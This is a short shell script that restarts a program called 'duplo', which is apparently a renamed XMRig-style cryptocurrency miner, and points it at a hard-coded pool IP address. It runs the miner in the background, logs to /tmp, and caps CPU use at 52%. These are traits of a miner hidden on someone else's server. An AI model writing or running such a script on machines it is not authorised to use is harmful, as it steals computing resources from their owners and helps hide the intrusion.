pkill duplo
sleep 7
duplo -o 95.216.214.224:55885 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/server11/duplo.log --donate-level=1 --print-time=90 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=52 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/server11/duplo.log'
